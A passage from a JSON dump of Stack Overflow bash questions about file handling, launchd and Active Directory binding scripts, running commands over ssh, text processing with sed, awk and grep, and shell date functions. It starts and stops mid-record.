bash shell","body":"<p>I am using a script to move a particular file from one location to another location, which retrieves that file name from a log file. When I run this command in the shell prompt, it's okay.</p>\n\n<p><strong><code>Example: When I run this command:</code></strong></p>\n\n<pre><code>tail -2 /pretupsvar/pretups_weblogs/DirectPayOutErrorLog.log |\n    grep 'MESSAGE: SQL Exception:Invalid column index' |\n    sed 's/.*FILE NAME: //;s/].*//;s/ /\\\\ /g'\n</code></pre>\n\n<p>the output is :</p>\n\n<pre><code>userList1305816669650_PB_PBZONE_DLMP_RLMP_ETOPUP_WEEL\\ ONE\\ PAYOUT.xls\n</code></pre>\n\n<p><strong><code>However, when I run this command:</code></strong></p>\n\n<pre><code>cp `tail -2 /pretupsvar/pretups_weblogs/DirectPayOutErrorLog.log |\n    grep 'MESSAGE: SQL Exception:Invalid column index' |\n    sed 's/.*FILE NAME: //;s/].*//;s/ /\\\\ /g'` /pretupshome/\n</code></pre>\n\n<p>the output is:</p>\n\n<pre><code>cp: cannot stat `userList1305816669650_PB_PBZONE_DLMP_RLMP_ETOPUP_WEEL':\n    No such file or directory\ncp: cannot stat `ONE': No such file or directory\ncp: cannot stat `PAYOUT.xls': No such file or directory\n</code></pre>\n\n<p><strong><code>Actually, I do the same in script which is like:</code></strong></p>\n\n<pre><code>fname=`tail -2 /pretupsvar/pretups_weblogs/DirectPayOutErrorLog.log |\n    grep 'MESSAGE: SQL Exception:Invalid column index' |\n    sed 's/.*FILE NAME: //;s/].*//;s/ /\\\\ /g'`\n\nmv /pretupsvar/pretups_weblogs/BulkComissionPayout/UploadOffline/$fname\n    /pretupsvar/pretups_weblogs/BulkComissionPayout/Errorfile/\n</code></pre>\n\n<p>But it can not move this file, showing the same error in above.</p>\n\n<p>Kindly help me: how can I move the same in a script?</p>\n"},{"tags":["bash","active-directory","sh","osx-mountain-lion","launchd"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":182,"score":0,"question_id":12586824,"title":"LaunchD Plist not working","body":"<p>EDIT: It appears as if I am getting an error in the console\ncom.apple.launchd: (com.xxxx.adbind[57]) Exited with code: 1</p>\n\n<p>What does that even mean?</p>\n\n<p>Also; if I load the launchd plist file logged in by using the launchctl command it works fine!</p>\n\n<p>I'm driving myself crazy trying to figure out why my launchd is not working.  I'm using this in Mountain Lion 10.8.2  When I manually start it using launchctl it says it's loaded, but the script is not running. The script when ran manually works fine as well. Perhaps it just needs a better set of eye's to look at what I'm doing.</p>\n\n<p>First, I'll explain what it is I'm trying to accomplish.  I'm having about 400 computers imaged off site.  I need these computers bound to AD, which can't be done out of our network.  I figured by having a launchd script run at startup to call a script, then have the script check to see if it's in the network before it runs I can have these computers bound at first startup in our network before an AD user logs in.</p>\n\n<p>Here's my launchd, I'm putting it in /Library/launchDaemons</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;\n&lt;plist version=\"1.0\"&gt;\n&lt;dict&gt;\n    &lt;key&gt;Label&lt;/key&gt;\n    &lt;string&gt;com.xxxx.adbind&lt;/string&gt;\n    &lt;key&gt;ProgramArguments&lt;/key&gt;\n    &lt;array&gt;\n        &lt;string&gt;/usr/local/bin/adbind.bash&lt;/string&gt;\n    &lt;/array&gt;\n    &lt;key&gt;RunAtLoad&lt;/key&gt;\n    &lt;true/&gt;\n    &lt;key&gt;WorkingDirectory&lt;/key&gt;\n    &lt;string&gt;/usr/local/bin&lt;/string&gt;\n&lt;/dict&gt;\n&lt;/plist&gt;\n</code></pre>\n\n<p>I've tried using this with and without a WorkingDirectory key.</p>\n\n<p>Here's my script, I'm putting my script in /usr/local/bin</p>\n\n<pre><code>#!/bin/bash\n\ncomputerid=`/usr/sbin/scutil --get LocalHostName`\n\n# Standard parameters\ndomain=\"xxx.xxxx.edu\"           # fully qualified DNS name of Active Directory Domain\nudn=\"xxxxxx\"            # username of a privileged network user\npassword=\"xxxxx\"                    # password of a privileged network user\nou=\"OU=xxx,DC=xxx,DC=xxxx,DC=edu\"       # Distinguished name of container for the computer\n\n# Advanced options\nalldomains=\"enable\"         # 'enable' or 'disable' automatic multi-domain authentication\nlocalhome=\"enable\"          # 'enable' or 'disable' force home directory to local drive\nprotocol=\"smb\"              # 'afp' or 'smb' change how home is mounted from server\nmobile=\"enable\"         # 'enable' or 'disable' mobile account support for offline logon\nmobileconfirm=\"disable\"     # 'enable' or 'disable' warn the user that a mobile acct will be created\nuseuncpath=\"enable\"         # 'enable' or 'disable' use AD SMBHome attribute to determine the home dir\nuser_shell=\"/bin/bash\"      # e.g., /bin/bash or \"none\"\npreferred=\"-preferred xxx.xxxxx.edu\"    # Use the specified server for all Directory lookups and authentication\n                            # (e.g. \"-nopreferred\" or \"-preferred ad.server.edu\")\nadmingroups=\"xxx\\admins,xxx\\teachers,xxx\\ADManagement - Computers,xxx\\employees\"    # These comma-separated AD groups may administer the machine (e.g. \"\" or \"APPLE\\mac admins\")\n\n# Login hook setting -- specify the path to a login hook that you want to run instead of this script\n\n### End of configuration\n\n## Wait until all network services are up.\nipconfig waitall\n\n# Check to see if we're in the district\nif ping -c 1 xxx.xxx.x.x\nthen\n\n# Activate the AD plugin\ndefaults write /Library/Preferences/DirectoryService/DirectoryService \"Active Directory\" \"Active\"\nplutil -convert xml1 /Library/Preferences/DirectoryService/DirectoryService.plist\nsleep 5\n\n# Remove computer from OU\ndsconfigad -f -r -u xxxxxxx -p xxxxxx\nsleep 5\n\n# Bind to AD\ndsconfigad -f -a $computerid -domain $domain -u $udn -p \"$password\" -ou \"$ou\"\n\n# Configure advanced AD plugin options\nif [ \"$admingroups\" = \"\" ]; then\n    dsconfigad -nogroups\nelse\n    dsconfigad -groups \"$admingroups\"\nfi\n\ndsconfigad -alldomains $alldomains -localhome $localhome -protocol $protocol \\\n    -mobile $mobile -mobileconfirm $mobileconfirm -useuncpath $useuncpath \\\n    -shell $user_shell $preferred\n\n# Restart DirectoryService (necessary to reload AD plugin activation settings)\nkillall DirectoryService\n\n# Add the AD node to the search path\nif [ \"$alldomains\" = \"enable\" ]; then\n    csp=\"/Active Directory/All Domains\"\nelse\n    csp=\"/Active Directory/$domain\"\nfi\n\n\n# This works in a pinch if the above code does not\ndefaults write /Library/Preferences/DirectoryService/SearchNodeConfig \"Search Node Custom Path Array\" -array \"/Active Directory/All Domains\"\ndefaults write /Library/Preferences/DirectoryService/SearchNodeConfig \"Search Policy\" -int 4\ndefaults write /Library/Preferences/DirectoryService/ContactsNodeConfig \"Search Node Custom Path Array\" -array \"/Active Directory/All Domains\"\ndefaults write /Library/Preferences/DirectoryService/ContactsNodeConfig \"Search Policy\" -int 4\n\nplutil -convert xml1 /Library/Preferences/DirectoryService/SearchNodeConfig.plist\n\n## Remove the script and launchd job. Be sure to delete the script.\nlaunchctl unload -w /Library/LaunchDaemons/com.xxxx.adbind.plist \nrm /Library/LaunchDaemons/com.xxxx.adbind.plist\nrm /usr/local/bin/adbind.bash\n\nexit 0\nelse\necho \"District not Available. Quitting\"\nexit 1\nfi\n</code></pre>\n\n<p>Thanks for any help!</p>\n"},{"tags":["c","bash","histogram"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":82,"score":1,"question_id":13121052,"title":"Statistically collecting rounding error in a program (C)","body":"<p>I wrote a program that compute 1000000! using FFT.</p>\n\n<p>(please allow me to be short and omit some theoretical resoning :) )</p>\n\n<p>What i want to do is measure ALL the rounding error between a double value and is <code>round()</code>-ed value (using <code>math.h</code> function) to check how this error is behaving (and if it is above 1/2).</p>\n\n<p>I'm doing so by printing the difference between <code>a</code> and <code>round(a)</code> each time i do rounding, and write the result into a file, let's call it <code>diffs.txt</code>, which is <code>~532Mb</code>, using</p>\n\n<p><code>fprintf(my_file,\"%e\\n\",a-round(a));</code></p>\n\n<p>I now need to count the occurrence of every single value that appear in that file.</p>\n\n<p>I'm doing so by what it seems to me an intricate way, using <code>grep</code>, <code>sort</code> and a bash <code>for</code> as follow:</p>\n\n<pre><code>./compute-rounding-err #It creates diffs.txt\nsort -u diffs.txt -o diff-sorted-unique\nfor i in `cat diff-sorted-unique`\ndo\n grep -e \"$i\" | wc -l &gt;&gt; diff-counted\ndone\n</code></pre>\n\n<p>The result is two file. If i pair that files i obtain</p>\n\n<pre><code>diff-sorted-unique:     diff_counted:\n-9.013892e-20           1           \n...                     ...\n0.000000e0              200\n...                     ...\n9.930234e               1\n</code></pre>\n\n<p>I can take these values and make an histogram out of them.</p>\n\n<p>My fear is that doing so on a laptop with a <code>~532Mb</code> file will take a long time.</p>\n\n<p>Anyone knows how to speed things up?</p>\n\n<p>Thanks.</p>\n"},{"tags":["linux","bash","make","gnu-coreutils"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":54,"score":2,"question_id":13205405,"title":"Why the bash I compiled(3.8M) is bigger the one my system provided(937K)?","body":"<p>I have download the bash shell version 4.2 form here: <a href=\"http://ftp.gnu.org/gnu/bash/\" rel=\"nofollow\">http://ftp.gnu.org/gnu/bash/</a>, and then compiled it by my self using the following command:</p>\n\n<pre><code>./configure\nmake\n</code></pre>\n\n<p>But the bash I compiled is much bigger then one system provided:</p>\n\n<p>This is my bash:</p>\n\n<pre><code>$ ls -lh bash\n-rwxrwxr-x 1 unimous unimous 3.8M Oct 31 23:57 bash\n</code></pre>\n\n<p>This is the system's bash:</p>\n\n<pre><code>$ ls -hl /bin/bash \n-rwxr-xr-x 1 root root 937K Sep 19 21:40 /bin/bash\n</code></pre>\n"},{"tags":["bash","emacs","zsh"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13176123,"title":"start C-x e editor in sh-mode","body":"<p>emacs: 23.3.1, zsh: 4.3.17, gnome-terminal: 3.4.1.1</p>\n\n<p>My default major mode is text-mode.</p>\n\n<p>When invoking <code>C-x e</code> in gnome-terminal I would like to set emacs to use sh-mode because it's very likely the mode I would set manually anyways. How to do so?</p>\n\n<p>Possible solution - \nIs there a way to create a template file for the <code>C-x e</code> cmd (to add a heading: <code># -*- mode: sh -*-</code>)?</p>\n\n<p><strong>Solution:</strong></p>\n\n<pre><code>;; open C-x e editor in sh-mode                                                                      \n(setq auto-mode-alist (cons '(\"\\\\(^\\\\|/\\\\)zshec[^/]*$\" . sh-mode) auto-mode-alist))\n</code></pre>\n"},{"tags":["linux","bash","unix"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":51,"score":2,"question_id":13204155,"title":"Split a string based on backslash delimiter","body":"<p>I'm new to bash scripting. I have a string which is like so: <code>\\\\abc\\def\\ghi</code></p>\n\n<p>I want to parse the string using a delimiter and need a one line command for converting it to <code>/abc/def/ghi</code> (convert Windows path to unix path).</p>\n"},{"tags":["bash","ssh","chef"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13202912,"title":"Running Interactive bash Commands over ssh","body":"<p>Im trying to automate my server provisioning process using chef. Since I don't want to run chef as root, I need a chef/deployer user. But I don't want to create this user manually. Instead, I want to automate this step. So I took a shot at scripting it but ran into an issue:</p>\n\n<p>The problem is that if I run</p>\n\n<blockquote>\n  <blockquote>\n    <p>ssh root@123.345.345.567 '/bin/bash -e' &lt; ./add_user.sh</p>\n  </blockquote>\n</blockquote>\n\n<p>where add_user contains</p>\n\n<blockquote>\n  <blockquote>\n    <p>//..if the username doesnt exist already\n      adduser $USERNAME --gecos ''</p>\n  </blockquote>\n</blockquote>\n\n<p>I never see the output or the prompts of the command.</p>\n\n<p>1) Is there a way to run interactive commands in this way?\n2) Is there a better way to add users in an automated fashion?</p>\n"},{"tags":["php","html","regex","bash","parsing"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":87,"score":2,"question_id":13118989,"title":"Modifying a PHP file from a Bash script","body":"<p>I need to perform some modifications to PHP files (PHTML files to be exact, but they are still valid PHP files), from a Bash script. My original thought was to use sed or similar utility with regex, but reading some of the replies here for other HTML parsing questions it seems that there might be a better solution.</p>\n\n<p>The problem I was facing with the regex was a lack of support for detecting if the string I wanted to match: <code>(src|href|action)=[\"']/</code> was in <code>&lt;?php ?&gt;</code> tags or not, so that I could then either perform string concatenation if the match was in PHP tags, or add in new PHP tags should it not be. For example:</p>\n\n<pre><code>(1) &lt;img id=\"icon-loader-small\" src=\"/css/images/loader-small.gif\" style=\"vertical-align:middle; display:none;\"/&gt;\n(2) &lt;li&gt;&lt;span class=\"name\"&gt;&lt;?php echo $this-&gt;loggedInAs()?&gt;&lt;/span&gt; | &lt;a href=\"/Login/logout\"&gt;Logout&lt;/a&gt;&lt;/li&gt;\n(3) &lt;?php echo ($watched_dir-&gt;getExistsFlag())?\"\":\"&lt;span class='ui-icon-alert'&gt;&lt;img src='/css/images/warning-icon.png'&gt;&lt;/span&gt;\"?&gt;&lt;span&gt;&lt;?php echo $watched_dir-&gt;getDirectory();?&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=\"ui-icon ui-icon-close\"&gt;&lt;/span&gt;\n(EDIT: 4) &lt;form method=\"post\" action=\"/Preference/stream-setting\" enctype=\"application/x-www-form-urlencoded\" onsubmit=\"return confirm('&lt;?php echo $this-&gt;confirm_pypo_restart_text ?&gt;');\"&gt;\n</code></pre>\n\n<p>In (1) there a <code>src=\"/css</code>, and as it is not in PHP tags I want that to become <code>src=\"&lt;?php echo $baseUrl?&gt;/css</code>. In (2), there is a PHP tag but it is not around the <code>href=\"/Login</code>, so it also becomes <code>href=\"&lt;?php echo $baseUrl?&gt;/Login</code>.\nUnfortunately, (3) has <code>src='/css</code> but <em>inside</em> the PHP tags (it is an echoed string). It is also quoted by <code>\"</code> in the PHP code, so the modification needs to pick up on that too. The final result would look something like: <code>src='\".$baseUrl.\"/css</code>.</p>\n\n<p>All the other modifications to my HTML and PHP files have been done using a regex (I know, I know...). If regexes could support matching everything except a certain pattern, like <code>[^(&lt;\\?php)(\\?&gt;)]*</code> then I would be flying through this part. Unfortunately it seems that this is Type 2 grammar territory. So - what should I use?\nIdeally it needs to be installed by default with the GNU suite, but other tools like PHP itself or other interpreters are fine too, just not preferred. Of course, if someone could structure a regex that would work on the above examples, then that would be excellent.</p>\n\n<p>EDIT: (4) is the nasty match, where most regexes will fail.</p>\n"},{"tags":["bash","sed","awk"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":36,"score":0,"question_id":13202715,"title":"Sed: get lines beginning with \"RIM-COD-\"","body":"<p>I have file Blackberry jad file:</p>\n\n<pre><code>RIM-COD-URL-12: HelloWorld-12.cod\nRIM-COD-Size: 68020\nRIM-MIDlet-Icon-2-1: ____HOVER_ICON_res/icon/blackberry/icon-68.png,focused\nRIM-COD-URL-11: HelloWorld-11.cod\nRIM-MIDlet-Icon-Count-2: 1\nRIM-COD-URL-10: HelloWorld-10.cod\nRIM-MIDlet-Icon-Count-1: 1\nMIDlet-Vendor: Vasia Pupkin\nRIM-MIDlet-Icon-1-1: res\\icon\\blackberry\\____HOVER_ICON_icon-68.png,focused\nManifest-Version: 1.0\nRIM-MIDlet-Flags-1: 0\nRIM-COD-SHA1-38: 9a c8 b3 35 72 de 34 5e 7a 0a 5b 9e c3 3a 65 4c 20 0f 8e 50\n</code></pre>\n\n<p>I just want to get lines begin with <code>RIM-COD-</code>.</p>\n\n<p>Can you provide me solutions for <code>awk</code> or <code>sed</code>?</p>\n"},{"tags":["bash","shell","sorting"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":3,"view_count":86,"score":-1,"question_id":10571620,"title":"how to use non-printable char as field separator of sort command in bash?","body":"<p>The sort command has a parameter \"-t\" to declare the fields separator instead of the default blank. For example:</p>\n\n<pre><code>sort -t 'a' file\n</code></pre>\n\n<p>what if I want to use a non-printable char as the spearator, like the fifth char in ASCII table ?</p>\n"},{"tags":["linux","bash","ssh","remote-access","pid"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":61,"score":6,"question_id":13200965,"title":"Bash: start remote python application through ssh and get its PID","body":"<p>I'm creating a little bash script to copy new files from a windows machine to a remote linux centos server (i run this script using the git-shell) then i want to restart the python application thats running in the server to use those new files.</p>\n\n<p>The problem is that everytime i run this script i want to end the actual running process before i start it again, so i want to get the pid of the process i start and save it to a file in the remote host so i can read it from there the next time i run the program and kill it.</p>\n\n<p>My code by now looks similar to this:</p>\n\n<pre><code>echo \"Copying code files to server...\"\n# The destination folder has to exist in the server\nscp -r ./python/ root@myserver:/root/\n\necho \"Checking for running processes...\"\n\nif ssh root@myserver 'ls dmr.pid &gt;/dev/null'; then\n    echo \"PID file exists, reading file...\"\n    PID=$(ssh root@myserver 'cat dmr.pid')\n\n    # Terminate the actual process\n    echo \"Terminating the process with PID '$PID'...\"\n    ssh root@myserver 'kill $PID'\nelse\n    echo \"PID file doesn't exist, not known processes running\"\nfi\n\n# Restart the server and get the PID\necho \"Restarting the server...\"\nssh root@myserver 'python /root/python/run_dev_server.py &gt; /dev/null 2&gt;&amp;1 &amp;'\n\nSERV_PID=$(ssh root@myserver 'echo $!')\n\necho \"Saving PID to file dmr.pid\"\nssh root@myserver \"echo '$SERV_PID' &gt; \\\"dmr.pid\\\"\"\n\necho \"Sucesfully finished!\"\n</code></pre>\n\n<p>The important lines are:</p>\n\n<pre><code>ssh root@myserver 'python /root/python/run_dev_server.py &gt; /dev/null 2&gt;&amp;1 &amp;'\nSERV_PID=$(ssh root@myserver 'echo $!')\n</code></pre>\n\n<p>the problem with this is that the script finishes but the file ends up empty as well as the $SERV_PID variable.</p>\n\n<p>And if i dont redirect the outputs and just do something like this:</p>\n\n<pre><code>SERV_PID=$(ssh root@myserver 'python /root/python/run_dev_server.py &amp; echo $!')\n</code></pre>\n\n<p>i get stuck after \"Restarting the server\" and never get the PID or the file that will contain it or even the end of the script.</p>\n\n<p>But if i run this right in the console:</p>\n\n<pre><code>ssh root@myserver 'python /root/python/run_dev_server.py &amp; echo $!'\n</code></pre>\n\n<p>i get a PID printed to the terminal.</p>\n\n<p>Any advice on this would be really appreciated.</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13202074,"title":"How to secure read? with bash \"read\" command","body":"<p>You know there is a command called read,</p>\n\n<p>What if I want to do this in my scripts,</p>\n\n<pre><code>read PASSWROD\n</code></pre>\n\n<p>when it prompts me to input, all my input is visible.\nIs there an alternative command that can make the input invisible.</p>\n\n<p>Thanks</p>\n"},{"tags":["bash","shell"],"answer_count":4,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":2890,"score":4,"question_id":8880603,"title":"Loop through array of strings in bash script?","body":"<p>I want to write a script that loops through 15 strings (array possibly?) is that possible?</p>\n\n<p>something like:</p>\n\n<pre><code>for databaseName in listOfNames\nthen\n# do something\nend \n</code></pre>\n\n<p>Thanks  </p>\n"},{"tags":["bash","file","scripting","sed","awk"],"answer_count":8,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":4865,"score":4,"question_id":4078933,"title":"find difference between two text files with one item per line","body":"<p>I have two files:</p>\n\n<p>file 1</p>\n\n<pre><code>dsf\nsdfsd\ndsfsdf\n</code></pre>\n\n<p>file 2</p>\n\n<pre><code>ljljlj \nlkklk \ndsf\nsdfsd\ndsfsdf\n</code></pre>\n\n<p>I want to display what is in file 2 but not in file 1, so file 3 should look like</p>\n\n<pre><code>ljljlj \nlkklk \n</code></pre>\n"},{"tags":["mysql","linux","bash","backup","mysqldump"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13201330,"title":"MySQL Backup Script in Bash","body":"<p>REF <a href=\"http://www.rsnapshot.org/howto/1.2/rsnapshot-HOWTO.en.html\" rel=\"nofollow\">http://www.rsnapshot.org/howto/1.2/rsnapshot-HOWTO.en.html</a>\n4.3.9. backup_script</p>\n\n<p>I need to backup ALL the mysql databases by dynamically should new ones be created. Is there an ideal way to do this in bash with minimal code?</p>\n\n<p>Would I need to log in to mysql and get all the databases?</p>\n"},{"tags":["bash","shell","unix","sed"],"answer_count":5,"favorite_count":4,"up_vote_count":15,"down_vote_count":0,"view_count":9559,"score":15,"question_id":5171901,"title":"Sed command find and replace in file and overwrite file doesnt work, it empties the file","body":"<p>I would like to run a find and replace on a html file through the command line.</p>\n\n<p>my command looks something like this:</p>\n\n<pre><code>sed -e s/STRING_TO_REPLACE/STRING_TO_REPLACE_IT/g index.html &gt; index.html\n</code></pre>\n\n<p>When I run this and look at the file afterward, it is empty. (it deleted the contents of my file)</p>\n\n<p>when i run this after restoring the file again:</p>\n\n<pre><code>sed -e s/STRING_TO_REPLACE/STRING_TO_REPLACE_IT/g index.html\n</code></pre>\n\n<p>the stdout is the contents of the file, and the find and replace has been executed.</p>\n\n<p>Why is this happening?</p>\n"},{"tags":["bash","variables","while-loop"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":13122441,"title":"BASH: While read line < $variable","body":"<p>How can I read from variable with while read line? this can save me disk writes. </p>\n\n<p>for example:</p>\n\n<pre><code>the_list=$(..code..)\n\nwhile read line\ndo\n        echo $line\n\ndone &lt; $the_list\n</code></pre>\n\n<p>using the code above gives me error:</p>\n\n<pre><code>./copy.sh: line 25: $the_list: ambiguous redirect\n</code></pre>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":32,"score":2,"question_id":13198917,"title":"active .bashrc setting in bash files","body":"<p>Instead of using default python, in .bashrc I change \"python\" point to my own python version. However, when I write a bash scripts and call for python in it, it still uses the default python. Why is that, and how can I set it so that I do not have to add \"source ~/.bashrc\" to every sh file? Thanks</p>\n\n<pre><code>[yl@chh test]$ more test.sh \necho `which python`\n[yl@chh test]$ sh test.sh \n/usr/bin/python\n[yl0@chh test]$ which python\nalias python='~/tools/Python-2.7.3/python'\n~/tools/Python-2.7.3/python\n</code></pre>\n"},{"tags":["osx","bash","for-loop","spaces"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":13198215,"title":"bash for loop using variables with spaces","body":"<p>I am on Mac OS 10.7.x and needing to interrogate network services to report on which interfaces are defined against a service and which dns servers are set against each.</p>\n\n<pre><code>servicesAre=`networksetup -listallnetworkservices | tail -n +2 | sed 's/.*/\"&amp;\"/'` ; \nfor interface in $servicesAre ; do \n      printf \" \\nFor $interface we have:\\n \\n\" ; \n      networksetup -getdnsservers $interface ; \ndone\n</code></pre>\n\n<p>My problem is the spaces in the initial variable list of interfaces:</p>\n\n<pre><code>\"USB Ethernet\"  \n\"Display Ethernet\"  \n\"Wi-Fi\"  \n\"Bluetooth PAN\"\n</code></pre>\n\n<p>How do I pass those through?</p>\n"},{"tags":["c","performance","bash","shell"],"answer_count":3,"favorite_count":1,"up_vote_count":7,"down_vote_count":1,"view_count":164,"score":6,"question_id":13088807,"title":"Shell script vs C performance","body":"<p>I was wondering how bad would be the impact in the performance of a program migrated to shell script from C. </p>\n\n<p>I have intensive I/O operations.</p>\n\n<p>For example, in C, I have a loop reading from a filesystem file and writing into another one. I'm taking parts of each line without any consistent relation. I'm doing this using pointers. A really simple program.</p>\n\n<p>In the Shell script, to move through a line, I'm using <code>${var:(char):(num_bytes)}</code>. After I finish processing each line I just concatenate it to another file.</p>\n\n<pre><code>\"$out\" &gt;&gt; \"$filename\"\n</code></pre>\n\n<p>The program does something like:</p>\n\n<pre><code>while read line; do\n    out=\"$out${line:10:16}.${line:45:2}\"\n    out=\"$out${line:106:61}\"\n    out=\"$out${line:189:3}\"\n    out=\"$out${line:215:15}\"\n    ...\n    echo \"$out\" &gt;&gt; \"outFileName\"\n\ndone &lt; \"$fileName\"\n</code></pre>\n\n<p>The problem is, C takes like half a minute to process a 400MB file and the shell script takes 15 minutes.</p>\n\n<p>I don't know if I'm doing something wrong or not using the right operator in the shell script.</p>\n\n<p>Edit: I cannot  use awk since there is not a pattern to process the line</p>\n\n<p>I tried commenting the \"echo $out\" >> \"$outFileName\" but it doesn't gets much better. I think the problem is the ${line:106:61} operation. Any suggestions? </p>\n\n<p>Thanks for your help.</p>\n"},{"tags":["bash","testing","tdd","automated-tests","extreme-programming"],"answer_count":5,"favorite_count":2,"up_vote_count":11,"down_vote_count":0,"view_count":4275,"score":11,"question_id":1339416,"title":"Testing bash scripts","body":"<p>We have a system that has some bash scripts running besides Java code. Since we are trying to \"Test Everything That Could Possibly Break\" and those bash scripts may break, we want to test them. The problem is it is hard to test the scripts.</p>\n\n<p>Is there a way or a best practice to test bash scripts?\n Or should we quit using bash scripts and look for alternative solutions that are testable?</p>\n"},{"tags":["linux","bash","grep"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13198662,"title":"grep initial space","body":"<p><code>man bash | grep \"\\-d\"</code></p>\n\n<p>lots of results</p>\n\n<p><code>man bash | grep \" \\-d\"</code></p>\n\n<p>no results</p>\n\n<p>What's going on here?</p>\n"},{"tags":["bash","shell","text"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":13197192,"title":"Replace specific rows with values from another text file in shell scripting?","body":"<p>I have a file that is 8 rows of single asterixes. I have 4 text files, with two rows of numbers in each. I want to create a new file for each of the text files, where row number i+2 and i+3 is replaced by the content of the text file. For example:</p>\n\n<p>File1 would be:  </p>\n\n<pre><code>1 5 7 8  \n2 4 5 6  \n</code></pre>\n\n<p>I want to convert it to:  </p>\n\n<pre><code>1 5 7 8  \n2 4 5 6  \n*  \n*  \n*  \n*  \n*  \n*  \n</code></pre>\n\n<p>And File2 would converted from:  </p>\n\n<pre><code>6 5 6 7  \n8 9 0 9  \n</code></pre>\n\n<p>to:  </p>\n\n<pre><code>*  \n*  \n6 5 6 7  \n8 9 0 9  \n*  \n*  \n*  \n*  \n</code></pre>\n\n<p>Is there a way to iterate through text files in a directory, converting each text file like above?</p>\n\n<p>Thanks!</p>\n\n<p>UPDATE: Maybe this will explain it better:</p>\n\n<p>Basically I have n-number of text files, each having only two rows of numbers. I want to cycle through the text files, converting each text file into another text file where there is n x 2 number of rows, with the first text file's values taking up row 1 &amp; 2 and the rest of the rows are *. The second text file would have n x 2 rows, but the 3rd and 4th row are the files values, with the rest being *. The third file having n x 2 rows, with the 6 &amp; 7th row being populated with its values and rest being *, and so on. </p>\n"},{"tags":["bash","shell","unix"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":13197207,"title":"Using Functions inside here document","body":"<p>I have a script which has a few functions inside it which the main body uses to execute. Now, I want to run this script on 3 remote unix machines. Which is the neatest way to do this ?\nMost importantly, I don't to write a second script for remote connection. Everything should be inside this one script.</p>\n\n<p>I've tried heredoc with ssh, which is not working because of the big functions !</p>\n\n<p><strong>Code -</strong> </p>\n\n<pre><code>#!/bin/bash\n\n# Year Month Day Related functions\n# FUNCTIONS\n# Find no. of days in a year\nyeardays()\n{\n# argument check\nif [ X$1 = X ]\nthen\n        read year\nelse\n        year=$1\nfi\n# Check for leap years\nif [ `expr $year % 400` = 0 ]\nthen\n        echo 366\n        exit\nfi\n\nif [ `expr $year % 100` = 0 ]\nthen\n        echo 365\n        exit\nfi\n\nif [ `expr $year % 4` = 0 ]\nthen\n        echo 366\n        exit\nfi\n\necho 365\n}\n\n# Find no. of days in a Month\nmonthdays()\n{\n# argument check\nif  [ X$1 = X ]\nthen\n     read ymd   # year in yyyymmdd format\nelif [ X$2 = X ]\nthen\n      ymd=$1\nelse\n      ymd=`expr \\( $1 \\* 10000 \\) + \\( $2 \\* 100 \\) + 1`\nfi\n\nyear=`expr $ymd / 10000` ;\nmonth=`expr \\( $ymd % 10000 \\) / 100` ;\n\ncase $month in\n      1|3|5|7|8|10|12) echo 31 ; exit ;;\n      4|6|9|11) echo 30 ; exit ;;\n      *) ;;\nesac\n\n# except for month 2, which depends on whether the year is a leap year\n# Use yeardays to get the number of days in the year and return a value\n# accordingly.\ndaysInYear=`yeardays $year`\n\ncase $daysInYear in\n   365) echo 28 ; exit ;;\n   366) echo 29 ; exit ;;\nesac\n}\n\nymd2yd()    # convert from YYYYMMDD(gregorian) to YYYYDDD(julian)\n{\n# argument check\nif [ X$1 = X ]\nthen\n        read date\nelse\n        date=$1\nfi\n\nyear=`expr $date / 10000`\nmonth=`expr \\( $date % 10000 \\) / 100`\ndays=`expr $date % 100`\n\ncount=1\nwhile [ `expr $count \\&lt; $month` = 1 ]\ndo\n        daysInMonth=`monthdays $year $count`\n        days=`expr $days + $daysInMonth`\n        count=`expr $count + 1`\ndone\n\njulian=`expr \\( $year \\* 1000 \\) + $days`\necho $julian\n}\n\nyd2ymd()    # convert from YYYYDDD(julian) to YYYYMMDD(gregorian)\n{\n# argument check\nif [ X$1 = X ]\nthen\n        read date\nelse\n        date=$1\nfi\n\nyear=`expr $date / 1000`\ndays=`expr $date % 1000`\n\nmonth=1\nwhile [ `expr $days \\&gt; 0` = 1 ]\ndo\n        daysInMonth=`monthdays $year $month`\n        days=`expr $days - $daysInMonth`\n        month=`expr $month + 1`\ndone\n\ndays=`expr $days \\+ $daysInMonth`\nmonth=`expr $month \\- 1`\n\ngregorian=`expr \\( $year \\* 10000 \\) + \\( $month \\* 100 \\) + $days`\necho $gregorian\n}\n\nydadd()     # Add/Subtract days to YYYYDDD format\n{\n# argument check\nif [ X$2 = X 